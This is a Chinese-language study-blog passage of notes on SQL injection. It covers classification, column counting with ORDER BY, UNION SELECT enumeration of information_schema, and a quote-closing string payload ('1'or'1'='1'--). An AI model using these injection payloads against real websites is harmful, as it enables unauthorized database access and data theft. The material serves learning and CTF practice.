---
title: WebLearning
date: 2023-07-25 19:43:58
tags:
- web
description: Web学习
---

# WebLearning

## SQL注入

本文参考探姬姐姐的文章，文章中均添加个人理解，若有错误请大佬联系我更正

[click here](https://ctf.tj.cn/) 

### 什么是SQL注入

sql注入是一种通过前端输入来在后端服务器执行恶意代码的攻击方式

> SQL注入的本质是后台SQL语句使用了拼接查询，未对用户输入的数据作安全处理

**SQL注入的分类** 

- 数字型注
- 字符型注
- 搜索形注

**请求方法不同，可分为**

- $_GET
- $_POST
- $_HEADER

**注入点不同，可分为** 

- 列注入
- 表注入
- order注入
- limit注入
- group by注入

### 数字型注入

#### 判断表的个数

```mysql
SELECT * FROM db.user where id=1 order by 2
```

chatgpt:该查询将返回db.user表中id等于1的行，并按照第二列的值进行排序。

[关于orderBy语法](https://www.runoob.com/sql/sql-orderby.html)

```mysql
SELECT column1, column2, ...
FROM table_name
ORDER BY column1, column2, ... ASC|DESC;
```

#### 获取数据库的库名

```mysql
select group_concat(schema_name) from information_schema.schemata;

```

**什么是schema** 

> schema:汉语意思为提要，纲要。

在mysql中，schema＝database

**information_schema** 

[information_schema](https://blog.csdn.net/kikajack/article/details/80065753)

information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。
information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。

**group_concat(schema_name)** 

MySQL `GROUP_CONCAT()` 函数将组中的字符串连接成为具有各种选项的单个字符串。

#### 猜解数据库表名

```mysql
1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()
1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database()
# 后台执行为：
SELECT username,password FROM users WHERE id = 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database();

```

### 字符型注入

假设有某个数据库的查询语句为

```mysql
SELECT * FROM users WHERE username='$username' AND password='$password';
```

字符型注入要注意构建 **闭合** 

>  **闭合** ：通过伪造符号来让select语句错误执行

在上述语句中，我们可以让 `username= 1'or'1'='1'--`

效果为

```mysql
SELECT * FROM users WHERE username='-1' or '1'='1' -- ' AND password='$password';
```

其中 `'1'='1'`是用真的，所以where的查询语句是成立的，就会把所有的信息都打出来

其余的方式与数字型注入差不多

- 判断列数

  ```mysql
  SELECT * FROM users WHERE username='-1' or '1'='1' order by 1-- ' AND password='$password';
  SELECT * FROM users WHERE username='-1' or '1'='1' order by 2-- ' AND password='$password';
  SELECT * FROM users WHERE username='-1' or '1'='1' order by 3-- ' AND password='$password';
  SELECT * FROM users WHERE username='-1' or '1'='1' order by 4-- ' AND password='$password'; # 报错
  ```

- 库名

  ```mysql
  SELECT * FROM users WHERE username='-1' or '1'='1' union SELECT 1,schema_name,2 FROM information_schema.schemata;-- ' AND password='$password';
  ```

- 表名

  ```mysql
  SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- ' AND password='$password';
  ```

- 字段名

  ```mysql
  SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- ' AND password='$password';
  ```

### 盲注

